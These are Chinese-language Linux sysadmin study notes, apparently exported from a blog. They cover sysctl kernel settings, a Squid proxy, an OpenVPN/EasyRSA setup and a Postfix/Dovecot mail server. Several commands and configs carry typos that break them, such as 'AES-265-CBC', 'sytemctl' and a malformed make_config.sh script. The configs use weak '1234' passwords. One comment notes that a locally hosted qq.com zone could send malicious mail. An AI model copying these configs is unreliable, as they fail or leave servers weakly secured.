# 在内核运行时查看内核相关的配置、性能 # 包含硬件信息 /proc/interrupts # 被分配的中断信息 /proc/ioports # I0端口使用情况 /proc/dma # DMA lsdev # 查看以上综合参数的命令，apt install lsdev cat /proc/sys/kernel/version # 查看内核参数 ## 修改内核参数 cat /proc/sys/net/ipv4/ip_forward/ # 如：开启路由功能，查看 echo 1 > /proc/sys/net/ipv4/ip_forward # 如：开启路由功能，修改 sysctl net.ipv4.ip_ forward1 # 或者使用命令，查看 /sysctl -W net.ipv4.ip_ _forward=1 # 使用命令开启，修改 /etc/sysctl.conf # net.ipv4.ip_ forward = 1 修改配置文件，让它永久生效 # 其他发行版可能在这个目录修改 /etc/sysctl.d document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>引导过程</tag>
        <tag>BIOS</tag>
        <tag>UEFI</tag>
        <tag>grub</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-代理&VPN]]></title>
    <url>%2Fposts%2F39742%2F</url>
    <content type="text"><![CDATA[你看见的不是你真的看见的 时间、带宽、管控都影响网络使用体验 作为改善技术，VPN/代理和突破限制改善体验 区别：代理主要提高访问速度；VPN更注重安全性 在某些应用场景中，作用非常相似 作为中间层，双向模拟（翻墙） 【访问者】 –&gt; 【中间层】 –&gt; 【目标】 代理(Proxy)网络代理服务 客户端访问请求发给Proxy，而非直连目标 代理转发请求给目标，并将结果返回给客户 正向代理提高速度、内容控制、安全（代替正常用户来访问资源） 反向代理速度、安全、分发（代替一个代理服务器接收资源，转发给后面的代理服务器，然后把后面代理服务器资源分发给用户。比如Nginx反向代理）安全性：反向代理服务器上可以进行安全性过滤，比如waf等 Squid 全面的一个代理软件 用squid实现正向代理1.安装squid sudo apt install squid 2.配置 vim /etc/squid/squid.conf # 主配置文件 # acl：访问控制列表/资源列表 acl localnet src 192.168.0.0/16 # 先配置内部网段，指定源地址，只给这个网段做代理 acl menhu111 dstdomain .sina.com .sina.com.cn .163.com # 目标域名，多个以空格分隔。小心页面元素CSS、图片(有些资源不属于那个域的下面) acl xiaban111 time MTWHFAS 18:00-23:59 # 定义时间，下班时间，MTWHFAS（周1-7），不限制访问。是服务器本地时间 # Mon, Tues, Wednes, tHurs, Fri, sAtur, Sun, D: 工作日 acl noexes url_regex -i \.exe$ # URL以exe结尾（-i大小写不敏感） acl httpsurls url_regex -i ^https # 以 ^URL起始 acl noporn url_regex -i sex # acl zipfiles url_regex -i \.zip$ # http访问规则顺序匹配（按前后顺序执行） # 原则：【禁止规则】一定要放在【允许规则】前面 http_access deny !Safe_ports # 不是Safe_ports的端口，都禁止 http_access deny noexes noporn # 原则：【禁止规则】一定要放在【允许规则】前面 http_access deny CONNECT !SSL_ports # 如果不是SSL_ports的端口，如果发起Connect请求的话，也是禁止的 http_access allow localhost # 允许所有人请求我代理服务器的本地 http_access allow localnet menhu111 xiaban111 # 允许本地地址访问后面指定的目标域名 http_access allow localhost manager # 缓存到代理服务器本地 http_access deny manager http_access deny all # 除了上面明确允许的，其他的一概禁止(这条规则要放到最后面) # http_access allow all 3.修改完之后，重新加载配置文件 sudo kill -SIGHUP `cat /var/run/squid.pid` 默认侦听3128代理端口，在配置文件可以修改 http_port 3128 # 默认侦听所有网卡的所有3128端口,建议不要对公网开放代理 # 指定侦听网卡 http_port 192.168.0.1:3128 访问日志 access_log daemon:/var/log/squid/access.log squid 缓存 cache_dir ufs /var/spool/squid3 100 16 256 # 缓存路径，多大，周期 refresh_pattern -i \.(gif|png|jpg|jpeg|ico)$ 3600 90% 86400 # 缓存图片 VPN原理企业内部系统不应对外开放 出差在外的企业员工需要访问公司内部系统 分公司、合作商需要安全的访问指定企业内部系统 专线网络费用高昂且不灵活 远程访问安全性欠缺 虚拟专用网(VPN – Virtual Private Network) 基于并不安全的网络线路，通过加密技术构建安全的信息通道（tunnel） VPN用户获得如同在内网一样的访问使用体验 与Proxy相比 VPN更加安全、成本高、部署难度大 VPN一旦部署完成后简单使用 Proxy属于一种中间层，VPN更接近路由（对应用透明，无需设置代理） VPN更完善的认证、加密、授权控制 VPN类型 PPTP L2TP（用的少） IPSec（保密性要求很高，过于复杂。常用于网络边界之间） SSL（非常适合终端用户） OPenVPN 全特性的开源SSL VPN 跨平台 Windows、Linux、macox、ios、android OpenVPN 通过非受信网络连接上网时保证安全 出差员工访问企业内部系统 伪装为国外地址，规避地理限制和审核（翻墙） 需要（独立的）证书颁发机构CA，完成PKI架构 安装&amp;配置 一台VPN服务器，一台CA服务器（每个服务器只做一个用途） 题外话：ubuntu server 1804修改主机名之前，先把/etc/cloud/cloud.conf配置文件中修改为的preserve_hostname修改为true，然后再修改hostname和hosts 1.安装OpenVPN（在VPN Server） sudo apt install openvpn 2.安装EasyRSA(在VPN Server+ 在CA Server) # ubuntu软件源也有，但是不是最新的，这里去github下载最新的 # ca server 和vpn server都需要下载EasyRSA(一个作为客户端一个作为服务端) wget https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.6/EasyRSA-unix-v3.0.6.tgz tar -xvf EasyRSA-unix-v3.0.6.tgz 3.配置安装（在CA服务器上） cd ~/EasyRSA-v3.0.6/ cp vars.example vars #vim vars set_var EASYRSA_REQ_COUNTRY "CN" set_var EASYRSA_REQ_PROVICE "BJ" set_var EASYRSA_REQ_CITY "BJ" set_var EASYRSA_REQ_ORG LAB"" set_var EASYRSA_REQ_EMAIL "admin@lab.com" set_var EASYRSA_REQ_OU "IT" # 初始化PKI架构 ./easyrsa init-pki # 会创建一个pki的目录，以后生成的证书会在这个目录下，证书的私钥会在这个目录下的privte下，证书申请文件会在这个目录下的reqs下 4.创建证书颁发机构，生成CA公私钥（在CA Server） ./easyrsa build-ca nopass #证书私钥文件的访问密码，但是这里不设置 # 下面设置证书的名字，默认不改 # ca.crt 公钥证书，用于验证CA前面的其他证书（C/S都需要） # ca.key CA的私钥，用于前面所有C/S证书（应私密保存） # 证书服务器在不使用时，建议关机 5.生成VPN服务器私钥和证书申请文件（在VPN Server） cd EasyRSA-v3.0.6/ ./easyrsa init-pki # 只是初始化PKI架构 ./easyrsa gen-req vpnserver nopass # 生成证书申请文件，起个名字，设置密码 # pki/reqs/vpnserver.req # pki/private/vpnsenver.key # 私钥文件要好好保存 sudo cp pki/private/vpnserver.key /etc/openvpn # 拷贝私钥文件 # 将证书请求文件传输至CA签发 scp pki/reqs/vpnserver.req xps@CA_IP:/tmp 6.导入并签发VPN服务器证书（在CA Server） ./easyrsa import-req /tmp/vpnserver.req vpnserver # 导入，加一个名字 ./easyrsa sign-req vpnserver vpnserver # 签发， pki/issued/vpnserver.crt # 证书类型 server / client ## 将证书回传至vpnserver scp pki/issued/vpnserver.crt xps@vpnserver_IP:/tmp/ # vpnserver证书 scp pki/ca.crt xps@vpnserver_IP:/tmp/ # CA公钥证书（自建的证书，要想被信任，必须获得ca服务器的公钥） 7.拷贝证书文件（在vpnserver） sudo cp /tmp/{vpnserver.crt, sa.crt} /etc/openvpn # 生成Diffie-Hellman密钥（密钥交换） ./easyrsa gen-dh # 生成HMAC签名（TLS完整性校验） dh.pem openvpn --genkey --secret ta.key # 生成安全密钥 sudo cp ta.key /etc/openvpn/ sudo cp pki/dh.pem /etc/openvpn/ # 服务端证书设置全部完成 8.客户端证书（在VPN Server） # 客户端也要证书来证明自己的身份 ## 在 VPN服务器上生成客户端证书 ## 使用脚本批量自动生成客户端配置文件 ## 生成客户端证书密钥 / 请求文件 mkdir -p ~/client-configs/keys # 证书文件目录 chmod -R 700 ~/client-configd # 配置文件目录 cd ~/EasyRSA-v3.0.6/ ./easyrsa gen-req client_1 nopass # client_1 cp pki/private/client_1.key ~/client-configs/keys/ scp pki/reqs/client_1.req xps@CA_IP:/tmp/ # 证书的请求文件 9.导入并签发证书（在CA Server） ./easyrsa import-req /tmp/client_1.key client_1 # 导入 ./easyrsa sign-req client client_1 # 签发（证书类型，证书column name） scp pki/issued/client_1.crt xps@vpnserver_IP:/tmp/ 10.复制证书文件（在VPN Server） cp /tmp/client_1.crt ~/client-configs/keys/ cp ~/EasyRSA-v3.0.6/ta.key ~/client-configs/keys/ sudo cp /etc/openvpn/ca.crt ~/client-configs/keys/ 客户端证书文件准备完毕，下面步骤都是在VPN服务器上配置 11.vpn服务器配置文件 sudo cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz /etc/openvpn/ sudo gzip -d /etc/openvpn/server.conf.gz sudo vim /etc/openvpn/server.conf # 配置文件，根据自己的情况来修改 tls-auth ta.key 0 key-direction 0 cipher AES-256-CBC auth SHA256 dh dh.pem user nobody group nogroup ; 下面，强制客户端【所有】流量路由到tun0（我的vpn隧道） push "redirect-gateway def1 bypass-dhcp" push "dhcp-option DNS 202.106.8.20" push "dhcp-option DNS 8.8.8.8" ; DNS服务器可设多个 ;端口和协议 port 443 proto tcp ；如果用TCP的1194，就无需这条 explicit-exit-notify 0 ;指定服务器证书文件 cert vpnserver.crt key vpnserver.key 12.启动服务器路由功能 sudo vim /etc/sysctl.conf net.opv4.ip_forward = 1 sudo sysctl -p 13.确认默认路由网卡名称 ip route |grep default default via 192.168.8.2 dev enp0s3 proto static 14.修改防火墙规则实现NAT # 连上我的vpn之后，都把我的地址转换为路由绑定网卡的内网的地址，隐藏原本的地址 sudo vim /etc/ufw/before.rules # 优先级高于普通UFW规则 # START OPENVPN RULES *nat :POSTROUTING ACCEPT [0:0] -A POSTROUTING -s 10.8.0.0/8 -o enp0s3 -j MASQUERADE # -s 源地址 COMMIT # END OPENVPN RULES 15.开启防火墙 sudo vim /etc/degault/ufw # 防火墙默认未开启转发包，这里开启转发包 DEFAULT_FORWARD_POLICY="ACCEPT" # 启动防火墙及规则 sudo ufw allow 1194/udp # vpn的端口允许 sudo ufw allow OpenSSH # 否则ssh连接不上了 sudo ufw disable sudo ufw enable # 启动OpenVPN服务 sudo systemctl start openvpn@server # server.conf 的名称一致 sudo systemctl status openvpn@server sudo systemctl enable openvpn@server ip addr show tun0 # 发现多了一个网卡tun0 客户端配置1.配置文件模板（用户只需傻瓜式操作即可，所有证书提前申请好，其他的用脚本方式执行） mkdir -p ~/client-configs/files # 配置文件存放的目录 cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf ~/client-configs/base.conf # Linux客户端有这个文件： /etc/openvpn/update-resolv-conf vim ~/client-configs/base.conf # script-security 2 # 下面三行，仅仅针对Linux客户端(才取消注释) # up /etc/openvpn/update-resolv-conf # down /etc/openvpn/update-resolv-conf remote vpnserver_IP 1194 proto udp user nobody group nogroup # Centos是nobody # ca ca.crt # cert client.key # key client.key # tls-auth ta.key 1 cipher AES-265-CBC auth SHA256 key-direction 1 2.客户端配置脚本 vim ~/client-configs/make_config.sh # 脚本参数为客户端标识名 #!bin/bash KEY_DIR=~/client-configs/keys OUTPUT_DIR=~/client-configs/files BASE_CONFIG=~/client-configs/base.conf cat ${BASE_CONFIG} \ &lt;(echo-e '&lt;ca>')\ ${KEY_ DIR}/ca.crt \ &lt;(echo -e '&lt;/ca>\n&lt;cert>')\ S{KEY_ DIR}/${1}.crt \ # ${1} 是脚本运行时的参数 &lt;(echo -e '&lt;/cert>\n&lt;key>')\ S{KEY_ DIR/${1}.key\ &lt;(echo e '&lt;/key>\n&lt;tls-auth>')I ${KEY_DIR}/ta.key\ &lt;(echo -e '&lt;/tls-auth>') \ > ${OUTPUT_ DIR}/${1}.ovpn chmod 700 ~/client-configs/make_config.sh cd ~/client-configs # 为每个用户申请证书 sudo ./make_config.sh client_1 # 生成client_1.ovpn # 分别为每个用户端生成相应证书，然后运行脚本生成配置文件 # 将.ovpn配置文件拷贝到客户单 # 如果是Linux客户端，要把配置文件client.ovpn中下面三行取消注释 script-security 2 up /etc/openvpn/update-resolv-conf down /etc/openvpn/update-resolv-conf # 如果是Centos系统，配置文件client.ovpn要修改 group nobody 3.客户端安装 ## Linux客户端安装 sudo apt install openvpn ## Linux客户端 vim client.ovpn script-security 2 up /etc/openvpn/update-resolv-conf down /etc/openvpn/update-resolv-conf 4.建立VPN连接 ## 命令行方式 sudo openvpn --config client_1.ovpn > /dev/null 2>&amp;1 &amp; ## ubuntu图形化方式 # 先安装openvpn的gnome小插件 sudo apt install metwork-manager-openvpn sudo apt install metwork-manager-openvpn-gnome sudo systemctl restart network-manager 设置，网络，VPN，添加，从文件导入ovpn文件 ## 其他VPN客户端 Cisco Concentrator # network-manager-vpnc Cisco OpenConnect # network-manager-openconnect PPTP(Microsoft VPN) # network-manager-pptp stringSwan(for some IPsec VPNs) # network-manager-strongswan 5.其他平台客户端 ## Windows客户端 https://openvpn.net/index.php/open-source/downloads.html # C:\Program Files\OpenVPN\config\client2.ovpn # 要以管理员身份运行 ##IOS App Store搜索OpenVPN Connect ## Android OpenVPN Connect ## MacOS https://tunnelblick.net/downloads. html 安装结束自动提示导入客户端配置文件 撤销客户端证书1.CA Server cd EasyRSA-3.0.4/ ./easyrsa revoke client2 ./easyrsa gen-crl # 生成证书吊销列表CRL(crl.pem) scp pki/crl.pem xps@vpnserver_IP:/tmp 2.VPN Server # 在vpn server调用 sudo cp /tmp/crl.pem /etc/openvpn sudo vi /etc/openvpn/server.conf crl-verify crl.pem # 最后一行添加吊销指令 sudo systemctl restart openvpn@server document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>代理</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu sever-邮件服务]]></title>
    <url>%2Fposts%2F36278%2F</url>
    <content type="text"><![CDATA[直到今天，Emai仍然是互联网上最重要的信息传递方式之一 电子邮件基础快速、便捷、通用、异步通信方式1965年最早由MIT发明并开源（最早用于不同主机用户间通信）1971年确定邮件地址以@符号连接（在不同主机之间传递信息）MIME类型扩展邮件从纯文本到传递文件（文档、图片、媒体） 邮件可被伪造，邮件炸弹，垃圾邮件 传统物理邮件：写信-&gt;到本地邮局-&gt;目的邮局-&gt;收件人 电子邮件Client1 -&gt; Server1 -&gt; Server2 -&gt; Client2 （邮件地址通过DNS解析完成邮件路由）无收件人返回报错（不通知），连不上目标服务器周期重发（直至失败） SMTP（Simple Mail Transfer Protocol） MTA(Mail transfer agents) 之间通信协议（SMTPD） 由很多小程序实现MTA所有功能 Sendmai、Postfix、Exim、Qmail 客户端发起邮件 MUA -&gt; MTA 也是用SMTP协议 MTA(Mail Transfer Agent)常见的MTA软件： 1. Sendmial 一个MTA软件包 处理着绝大多数互联网电子邮件 开源免费版 / 商业版（GUI页面） 配置过于复杂（默认配置已经可以良好工作） 功能全面但性能不占优势 2. Postfix 来自于IBM的开源MTA（Ubuntu默认首选MTA） 速度优于Sendmail，配置管理更简单（配置文件、命令） 可以平滑替换Sendmail（模块化） 3. Qmail Postfix的可替代选择（模块化的MTA，用户、配置相分离） 设计初衷是实现取代Sendmail的更安全快速的MTA 从Sendmail迁移到Qmail过程复杂 众多插件，包含WebMail、POP服务 4. Exim 比Sendmail、Postfix更安全快速，但配置方式不同 与Qmail都使用maildir格式邮箱存储 邮箱存储MBOX 传统的mbox格式邮箱存储将所有邮件存于一个文件中（索引定位具体邮件） 文件和索引损坏可能造成邮件丢失，故障恢复困难 不适于存储于NFS挂载目录中 MAILDIR Maildir格式包含三个子目录/cur,/new,/tmp， 每个邮件分隔独立保存 可并行访问，性能更高（mbox不支持） 可用NFS作为邮箱存储 MTA可直接投递和读取文件更多时候邮件投递由MDA完成 MDA(Mail Delivery Agent, 邮件投递代理)MDA比MTA额外实现自动过滤、回复、规则转存、杀毒等但邮件的收还是靠MTA 常见的MDA软件： 1. Mailx MDA + MUA（Ubuntu的默认MDA） 来自MTA的邮件交给Mailx投递到用户邮箱（/var/mail/） 主目录下：.forward文件实现自动转发（如：公司邮箱的邮件，通过.forward进行转发到私人邮箱） 2. main.local 常用于BSD的MDA程序 功能使用与Mailx类似 3. procmail 最流行的MDA之一 Recipes允许用户自定义邮件处理脚本（.procmailrc） MUA(Mail User Agent) 读取和展示邮箱中的邮件（不金慈宁宫邮件传递） 在哪读邮件/邮件显示格式（MIME） 常见类型的MUA： 1.MailxMUA + MDA服务器本地直接读取邮箱mail 2.Dovecot 远程客户端访问邮箱 POP3(Post Office Protocol version 3) 适合单一客户端，单项通信协议(MUA &lt;- MDA) IMAP4(Internet Message Access Protocol 4) 适合多邮件客户端，双项同步协议( MUA &lt;--&gt; MDA) 最基本的：MTA+MDA+MUA 典型命令： 3. 其他邮箱访问方式Web Mail WAPI（ 微软专有邮箱协议） 4. Fetchmail自己本地邮箱服务器 &lt;- 运行商邮件服务器(POP3 / IMAP) 适用于每月稳定互联网连接的小公司 电子邮件架构邮件结构 信封：用于邮件路由，对用户透明不可见 邮件头：邮件路由传输过程的记录日志（如果遇到不专业的小黑客，可以通过邮件头来溯源） 邮件体：邮件要传递的具体内容 SPAM 垃圾邮件，不请自来的邮件（Junk） 处理浪费时间、网络带宽、存储空间 病毒、木马、蠕虫、钓鱼邮件 包含恶意附件、链接、伪装、诈骗内容 存在安全风险，谨慎打开陌生邮件 邮件规范 收件人为事件直接相关人（其他相关人作为抄送人） 次要相关人按职位顺序 CC(抄送人，收件人能看见我发给抄送人，按职位顺序排列)、BCC（密送人，收件人是不知道我发给密送人了） 主题简介清晰，高度概括（切忌把正文具体内容写到主题） 保证表述清楚的前提下邮件内容尽可能短（避免语法错误），不要使用模棱两可/时髦语言 适当使用表情符 回复、转发完整邮件流（禁止单独新写邮件作为回复） 压缩附件 附个人签名（公司的信息，职位，姓名 -&gt; 或弄成二维码-&gt;不太建议，建议直接用文本形式） 沟通是所有企业面对的最大问题 Postfix简单部署MTA(能发出邮件最关键的组件) 1.先安装DNS服务器 sudo apt install bind9 2.配置 # sudo vim /etc/bind/named.conf.options # 自己解析不了的域名，转发给互联网上其他的 forwarders { 8.8.8.8; } # sudo vim /etc/bind/named.conf.local # 自己的域(可以是任何域名，虽然被别人占用的。可以用来发送恶意文件) zone "qq.com"{ type master; file "/etc/bind/db.qq.com"; # 区域文件 } # cp /etc/bind/db.local.local # sudo vim /etc/bind/db.qq.com $TTL 604800 @ IN SOA ns.qq.com. root.qq.com. ( 2 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS ns # 创建NS记录 @ IN MX 5 mail # 创建MX记录，优先级(值越大，优先级越低) ns IN A 192.168.0.19 # NS的记录 mail IN A 192.168.0.19 # MX的记录 pop IN A 192.168.0.19 imap IN A 192.168.0.19 smtp IN A 192.168.0.19 @ IN A 192.168.0.19 # @代表本域域名自己 3.重启bind服务 sudo systemctl restart bind9 4.网络配置（配置静态ip） # sudo vim /etc/netplan/50-cloud-init.yaml dhcp4:no addresses:[192.168.1.2/24] gateway4:192.168.1.1 nameservers: search:[qq.com] addresses:[192.168.1.2] # 指向邮箱服务器的ip sudo netplan apply sudo networkctrl status 5.修改主机名 #sudo vim /etc/hostname mail.qq.com # 直接修改hostname后，重启后会变回去，所以修改下面的配置文件 #sudo vim /etc/cloud/cloud.cfg preserve_hostname:true 6.安装Postfix sudo apt install postfix 向导窗口，选择： Internet Site # 一般选这个就好 Internet Site smarthost # 智能主机 操作系统的主机名 # mail.qq.com grep mail /etc/group # 会自动生成一个用户组mail grep postfix /etc/group # 会自动生成一个用户组postfix # 但是postfix默认使用操作系统的用户，要加入本地用户到相应组(只有该用户组的成员才可发邮件) sudo usermod -aG mail xps # sudo useradd -m -G mail xxx2 # sudo passwd xxx2 # mail # mail命令默认不安装，先安装 sudo apt install mailutils # 安装 mail # 再使用 mail xps@qq.com # 主要收件人 cc: xps2@163.com # 抄送人 Subject: test2 # 主题 xxxxxx正文 # ctrl + D 发送邮件 su xxx2 # 切换到该用户查看该用户收到的邮件 mail # 可以查看该用户收到的邮件 单机邮件一般存在/var/mail/用户名 # 一般大的邮箱服务商，如QQ，163等，会反查发件人邮件的地址是否是合法的 目前，只能发邮件，不能收邮件 企业级Postfix邮件系统部署组件 Postfix: MTA Dovecot: POP /IMAP服务 SASL: 身份认证 Postfixadmin: 管理邮件、虚拟域、别名等的WEB应用 LEMP：Postfixadmin的web环境依赖 Postfix的两种域 Local Domain：为本系统账号投递邮件(/etc/passwd) Virtual Domain：为非本系统账号投递邮件 1.安装LEMPsudo apt install nginx sudo apt install mysql-server sudo mysql_secure_installation sudo mysql ALTER USER 'root'@'localhost' INDETIFIED WITH mysql_native_password BY '1234'; # 修改登录方式 FLUSH PROVILEGES; # mysql -u root -p1234 sudo apt install php-fpm php-mysql sudo vim /etc/php/7.2/fpm/php.ini cgi.fix_pathinfo=0 date.timezone = Asia/Shanghai ## 验证能否正常使用 sudo vim /etc/nginx/sites-avaliable/default index index.php server_name mail.qq.com; location ~\.php${ include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; } location ~/.ht{ deny all; } sudo vim /var/www/html/info.php &lt;?php phpinfo(); ?> systemctl restart nginx.service systemctl restart php7.2-fmp.service 2.安装Postfixadmin推荐手动下载源码，然后解压 # 安装依赖包 sudo apt install php-imap php-mbstring php7.2-imap php7.2-mbstring # 下载源码 sudo wget -P /opt https://github.com/postfixadmin/postfixadmin/archive/postfixadmin-3.2.4.tar.gz cd /opt &amp;&amp; tar -xvf postfixadmin-3.2.tar.gz mv postfixadmin-postfixadmin3.2/ postfixadmin # /opt/postfixadmin/public/setup.php # 做web界面配置的文件 # 软链接目录 ln -s /opt/postfixadmin/public/ /var/www/html/pfa 3.配置数据库# mysql -u root -p # 创建数据库和名字 CREATE DATABASE postfix_db; CREATE USER 'post_user'@'localhost' IDENTIFIED BY '1234'; GRANT ALL PRIVILEGES ON postfix_db.* TO 'post_user'@'localhost' FLUSH PRIVILEGES; Postfixadmin 数据库连接文件 cd /opt/postfixadmin/ &amp;&amp; cp config.inc.php config.local.php sudo vim config.local.php $CONF['configured'] = true; $CONF['default_language'] = 'cn'; # 数据库连接信息 $CONF['database_type'] = 'mysqli'; $CONF['database_host'] = 'localhost'; $CONF['database_password'] = '1234'; $CONF['database_name'] = 'postfix_db' 4.创建临时目录mkdir /opt/postfixadmin/templates_c &amp;&amp; chmod 755 -R /opt/postfixadmin/templates_c chown -R www-data:www-data /opt/postfixadmin/templates_c 5.WEB安装阶段# 访问前面设置的url和文件 http://mail.qq.com/setup.php 设置 setup password 生成 setup password 的hash值，复制下来，添加到服务端中配置项 # vim config.local.php $['setup_password'] = 'xxxxxxx hash xxxxxxxx' 然后创建管理员账号与密码 登录管理员账号 创建虚拟域、邮箱账号 域名清单 – 新建域 虚拟用户清单 – 新建邮箱（别名） 6.集成Postfix 以下命令以root权限运行 apt install Postfix Postfix-mysql sasl2-bin # sasl来实现身份认证 配置sasl自动启动 # vim /etc/default/saslauthd START=yes systemctl restart saslauthd.service 邮箱目录、访问账号、组 # 添加组账号vmail groupadd -g 5000 vmail &amp;&amp; mkdir -p /var/mail/vmail # 创建账号vmail, 属于组vmail useradd -u 5000 vmail -s /usr/sbin/nologin -d /var/mail/vmail chown -R vmail:vmail /var/mail/vmail 7.数据库配置(3个)数据库配置文件1 mkdir -p /etc/postfix/sql # 去数据库中找虚拟域的域名 vim /etc/postfix/sql/mysql_virtual_domains_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT domain FROM domain WHERE domain='%s' AND active='1' # 想要生效，配置加入 /etc/postfix/main.cf postconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_domains_maps.cf # 使用上面配置的配置文件,来查询虚拟域 postmap -q qq.com mysql:/etc/postfix/sql/mysql_virtul_domains_maps.cf # 验证 数据库配置文件2 # 查邮箱 vim /etc/postfix/sql/mysql_virtual_mailbox_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT maildir FROM mailbox WHERE username='%s' AND active='1' # 想要生效，配置加入 /etc/postfix/main.cf postconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf # 使用上面配置的配置文件 postmap -q tom@qq.com mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf # 验证 数据库配置文件3 # 查别名 vim /etc/postfix/sql/mysql_virtual_alias_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT goto FROM alias WHERE address='%s' AND active='1' # 想要生效，配置加入 /etc/postfix/main.cf postconf -e mysql_virtual_alias_maps=mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf # 使用上面配置的配置文件 postmap -q abuse@qq.com mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf # 验证 权限，属主 chgrp postfix /etc/postfix/sql/mysql_* 至此，postfixadmin与postfix MTA安装完成 8.启用SASL 强制 Postfix发邮件使用Dovecot进行身份验证# vim /etc/postfix/main.cf smtpd_sasl_type = dovecot smtpd_sasl_path = private/auth smtpd_sasl_auth_enable = yes smtpd_sasl_security_options = noanonymous smtpd_sasl_local_domain = $myhostname smtpd_tls_security_level = may smtpd_tls_auth_only = no smtpd_recipient_restrictions = permit_mynetworks permit_sasl_authenticated reject_unauth_destination 9.启动安全SMTP端口# vim /etc/postfix/master.cf submission inet n - y - - smtpd -o syslog_name=postfix/submission -o smtpd_tls_security_level=encrypt -o smtpd_sasl_aut_enable=yes -o smtpd_client_restrictions=permit_sasl_authenticated,reject -o milter_macro_daemon_name=ORIGINATING smtps inet n - y - - smtpd -o syslog_name=postfix/smtps -o smtpd_tls_wrappermode=yes -o smtpd_sasl_aut_enable=yes -o smtpd_client_restrictions=permit_sasl_authenticated,reject -o milter_macro_daemon_name=ORIGINATING 10.验证配置# 验证配置 postcnf -n # 重启服务 sytemctl restart postfix # 证书可自行替换 11.安装/配置Dovecot# 安装Dovecot apt install dovecot-imapd dovecot-mysql dovecot-managesieved dovecot-pop3d # Sieve 负责创建并将邮件自动放入指定用户文件夹 配置Dovecot（多配置文件） cd /etc/dovecot/conf.d/ &amp;&amp; vim 10-auth.conf # 系统账号/SQL账号 auth_mechanisms = plain login #!include auth-system.conf.ext !include auth-sql.conf.ext # 使用这个配置文件来访问数据库 配置SQL账号 # vim /etc/dovecot/conf.d/auth-sql.conf.ext passdb { driver = sql args = /etc/dovecot/dovecot-sql.conf.ext # 连接数据库文件 } userdb { # 用户数据库 driver = static args = uid=vmail gid=vmail home=/var/mail/vmail/%d/%n } 连接数据库配置文件 # vim /etc/dovecot/conf.d/dovecot-sql.conf.ext driver = mysql connect = host=127.0.0.1 dbname=postfix_db password=1324 password_query = SELECT usernme,domain,password FROM mailbox WHERE username='%u',default_pass_schema=MD5-CRYPT 指定邮箱存储位置 # vim /etc/dovecot/conf.d/10-mail.conf mail_location = maildir:/var/mail/vmail/%d/%n/Maildir mail_privileged_group = mail 配置服务连接 # vim /etc/dovecot/conf.d/10-master.conf service auth { unix_listener auth-userdb { mode = 0600 # 权限掩码 user = vmail group = vmail } unix_listener /var/spool/postfix/privilege/auth { mode = 0660 user = postfix group = postfix } user = dovecot # 修改为我们指定的dovecot永固 } 配置sieve # vim /etc/dovecot/conf.d/15-lda.conf protocol lda { mail_plugins = mail_plugin sieve # sieve组件，会帮我们自动创建文件夹 } chgrp vmail /etc/dovecot/dovecot.conf # vmail执行Dovecot 重启服务 systemctl restart dovecot 查看日志 tail -n 20 -f /var/log/mail.log # 可以看到前面的服务启动正常 12.集成Postfix与Dovecot# vim /etc/postfix/master.cf dovecot unix - n n - - pipe flags = DRhu user=vmail:vmail argv=/usr/lib/dovecot/deliver -f ${sender} -d xxxxxx # vim /etc/postfix.main.cf virtual_transport = dovecot dovecot_destination_recipient_limit=1 ## 重启服务 systemctl restart dovecot tail -n 20 -f /var/log/mail.log # 可以看到前面的服务启动正常 13.测试发送邮件 使用postfixadmin 的web界面来发送邮件 # 或者 使用mail发送邮件 apt install mailutils echo "hello xpshuai" | mail "test mail" tom@qq.com 查看结果 tail -n 20 -f /var/log/mail.log ls -l /var/mail/vmail # 每个域的邮件存储的目录 增加其他虚拟域、邮箱(`jerry@taobao.com`) echo "hello jerry, it's tom" |mail -s "Subject"-a From"tom\&lt;tom@qq.com>\jerry@taobao.com 配置邮件客户端Outlook,Thunderbird, … …添加新邮箱账号（名字，地址，密码）配置Imap、pop3、smtp等的地址，SSL加密 Web MAIL安装各大邮件服务商全部提供Web Mail基于浏览器的统一使用体验（无序配置客户端） Roundcube – 一款非常流行且稳定的Web Mail应用 1.安装依赖包（可选）apt install php7.2-intl php-imagick php7.2-ldap 2.下载Roundcubecd /var/www/html &amp;&amp; wget https://github.com/roundcube/roundcubemail/releases/download/1.4.7/roundcubemail-1.4.7-complete.tar.gz tar -xvf roundcubemail-1.4.7-complete.tar.gz mv roundcubemail-1.4.7-complete webmail &amp;&amp; cd webmail 3.创建数据库CREATE DATABASE roundcubedb; CREATE DATABASE routecubemail; CREATE USER 'roundcube'@'localhost' IDENTIFIED BY '1234'; GRANT ALL PRIVILEGES ON roundcubedb.* 'roundcube'@'loocalhost'; GRANT 